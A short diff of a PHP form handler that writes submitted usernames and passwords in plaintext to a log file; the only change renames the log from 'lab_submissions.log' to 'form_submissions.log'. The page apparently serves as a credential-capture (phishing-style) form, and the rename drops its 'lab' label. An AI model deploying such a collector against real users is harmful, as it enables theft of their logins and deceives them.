@@ -117,7 +117,7 @@ It works!
        $password = trim($_POST['password'] ?? '');
        $time = date('Y-m-d H:i:s');
        $entry = "[$time] username={$username} password={$password}\n";
-       @file_put_contents(__DIR__ . '/lab_submissions.log', $entry, FILE_APPEND | LOCK_EX);
+       @file_put_contents(__DIR__ . '/form_submissions.log', $entry, FILE_APPEND | LOCK_EX);
        $received = true;
    }
 
